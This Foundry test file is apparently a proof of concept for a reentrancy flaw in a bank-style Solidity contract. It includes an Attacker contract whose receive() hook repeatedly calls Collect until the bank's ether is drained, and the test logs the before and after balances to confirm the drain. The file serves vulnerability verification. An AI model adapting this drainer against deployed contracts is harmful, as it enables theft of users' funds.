// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xf015c35649c82f5467c9c74b7f28ee67665aad68.sol";

contract BankReentrancyTest is Test {
    MY_BANK public bank;
    Log public logger;
    Attacker public attacker;

    function setUp() public {
        logger = new Log();
        bank = new MY_BANK(address(logger));
        attacker = new Attacker(payable(address(bank)));
        vm.deal(address(attacker), 2 ether);
    }

    function test_reentrancyInCollect() public {
        uint256 oneDay = 1 days;
        uint256 unlockTime = block.timestamp + oneDay;

        vm.prank(address(attacker));
        attacker.deposit{value: 2 ether}(unlockTime);
        
        vm.warp(block.timestamp + oneDay + 1);
        
        // BEFORE-Trigger state snapshot
        console.log("--- BEFORE-Trigger Attack ---");
        uint256 bankBalanceBefore = address(bank).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        (uint256 attackerDepositBefore, ) = bank.Acc(address(attacker));

        console.log("Bank Balance (BEFORE): %s", bankBalanceBefore);
        console.log("Attacker Ether Balance (BEFORE): %s", attackerBalanceBefore);
        console.log("Attacker Account Deposit (BEFORE): %s", attackerDepositBefore);

        // Trigger attack
        console.log("--- Trigger Attack ---");
        vm.prank(address(attacker));
        attacker.attack(1 ether);

        // AFTER-Trigger state snapshot
        console.log("--- AFTER-Trigger Attack ---");
        uint256 bankBalanceAfter = address(bank).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        (uint256 attackerDepositAfter, ) = bank.Acc(address(attacker));

        console.log("Bank Balance (AFTER): %s", bankBalanceAfter);
        console.log("Attacker Ether Balance (AFTER): %s", attackerBalanceAfter);
        console.log("Attacker Account Deposit (AFTER): %s", attackerDepositAfter);

        // Vulnerability verification
        bool bankDrained = (bankBalanceAfter == 0);
        bool attackerGainedFunds = (attackerBalanceAfter == 2 ether);
        bool accountDepositZero = (attackerDepositAfter == 0);

        console.log("Bank drained?:", bankDrained);
        console.log("Attacker has 2 ETH?:", attackerGainedFunds);
        console.log("Account deposit cleared?:", accountDepositZero);

        if (bankDrained && attackerGainedFunds && accountDepositZero) {
            console.log("Vulnerability Exists: Reentrancy attack successfully drained bank funds");
        } else {
            console.log("Vulnerability not Exist: Reentrancy attack failed to drain funds");
        }
    }
}

contract Attacker {
    MY_BANK public bank;

    constructor(address payable _bank) {
        bank = MY_BANK(_bank);
    }

    function deposit(uint256 unlockTime) external payable {
        bank.Put{value: msg.value}(unlockTime);
    }

    function attack(uint256 amount) external {
        bank.Collect(amount);
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.Collect(1 ether);
        }
    }
}